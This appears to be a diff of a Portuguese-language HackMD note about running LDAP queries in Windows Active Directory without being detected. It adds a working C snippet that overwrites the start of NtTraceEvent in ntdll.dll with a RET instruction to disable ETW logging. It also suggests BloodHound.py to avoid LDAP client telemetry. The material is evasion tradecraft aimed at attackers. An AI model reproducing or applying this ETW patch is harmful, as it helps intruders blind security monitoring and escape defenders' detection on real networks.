@@ -3,6 +3,7 @@ title: 'Fazendo consultas no LDAP sem ser detectado'
 disqus: hackmd
 ---
 
+
 Fazendo consultas no LDAP sem ser detectado
 ===
 
@@ -30,7 +31,15 @@ Pro azar do hacker leigo, o Windows pode promover uma auditoria host-based do LD
 ---
 - E pode fazer uma auditoria do LDAP habilitando o `Microsoft-Windows-ActiveDirectory_DomainService` no Event Viewer.
 ## Executando consultas sem ser detectado
-- O primeiro método que eu vou apresentar, contra o provedor `Microsoft-Windows-LDAP-Client`, vai ser patchear o ETW (no nosso caso user-mode), sim, isso mesmo. A ideia é localizar o memory address de uma função especifica do provedor q vc queira patchear (`EtwEventWrite`, `NtTraceEvent`, etc...), e adicionar uma instrução específica.
+- O primeiro método vai ser patchear o ETW.
+  - A ideia é calcular o offset da syscall q vc queira patchear (`NtTraceEvent`, `EtwEventWrite`, etc...) em uma dll (`ntdll.dll`) e depois adicionar uma instrução RET (`0xC3`)
+```c
+DWORD dwOld = 0;
+FARPROC ptrNtTraceEvent = GetProcAddress(LoadLibrary("ntdll.dll"), "NtTraceEvent");
+VirtualProtect(ptrNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &dwOld);
+memcpy(ptrNtTraceEvent, "\xc3", 1);
+VirtualProtect(ptrNtTraceEvent, 1, dwOld, &dwOld);
+```
 
 - O segundo método contra o `Microsoft-Windows-LDAP-Client` é usar uma tool como o [BloodHound.py](https://github.com/dirkjanm/BloodHound.py), que não usa a `wldap32.dll`
 
